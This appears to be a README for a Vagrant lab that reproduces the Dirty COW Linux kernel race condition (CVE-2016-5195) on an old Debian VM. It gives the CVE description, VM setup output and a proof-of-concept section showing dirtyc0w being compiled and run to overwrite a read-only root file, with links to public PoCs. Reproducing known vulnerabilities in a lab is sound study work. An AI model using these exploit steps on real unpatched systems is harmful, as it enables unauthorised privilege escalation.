# CVE-2016-5195_DirtyCow 

## Vulnerability information

 * Description

```
	Race condition in mm/gup.c in the Linux kernel 2.x through 4.x before 4.8.3 allows local users to gain privileges by leveraging incorrect handling of a copy-on-write (COW) feature to write to a read-only memory mapping, as exploited in the wild in October 2016, aka "Dirty COW."
```

## vagrant up

```
$ vagrant up
Bringing machine 'vve.test' up with 'virtualbox' provider...
==> vve.test: Importing base box 'debian/wheezy64'...
==> vve.test: Matching MAC address for NAT networking...
==> vve.test: Checking if box 'debian/wheezy64' is up to date...
==> vve.test: Setting the name of the VM: CVE-2016-5195_DirtyCow_vvetest_1518397500434_97609
==> vve.test: Fixed port collision for 22 => 2222. Now on port 2200.
==> vve.test: Clearing any previously set network interfaces...
(snip)
    vve.test: Guest Additions Version: 4.3.18
    vve.test: VirtualBox Version: 5.2
==> vve.test: Configuring and enabling network interfaces...
```

## vagrant ssh

```
$ vagrant ssh
Linux debian-780-wheezy 3.2.0-4-amd64 #1 SMP Debian 3.2.65-1 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Apr 24 08:15:24 2015 from 10.0.2.2
-bash: warning: setlocale: LC_ALL: cannot change locale (ja_JP.UTF-8)
-bash: warning: setlocale: LC_ALL: cannot change locale (ja_JP.UTF-8)
-bash: warning: setlocale: LC_ALL: cannot change locale (ja_JP.UTF-8)
```

 = POC

 == dirtyc0w == 

```
$ sudo -s
# echo this is not a test > foo
# chmod 0404 foo
$ ls -lah foo
-r-----r-- 1 root root 19 Oct 20 15:23 foo
$ cat foo
this is not a test
$ gcc -pthread dirtyc0w.c -o dirtyc0w
$ ./dirtyc0w foo m00000000000000000
mmap 56123000
madvise 0
procselfmem 1800000000
$ cat foo
m00000000000000000
```

# Reference 

  * https://dirtycow.ninja/
  * https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
  * https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
  * https://security-tracker.debian.org/tracker/CVE-2016-5195


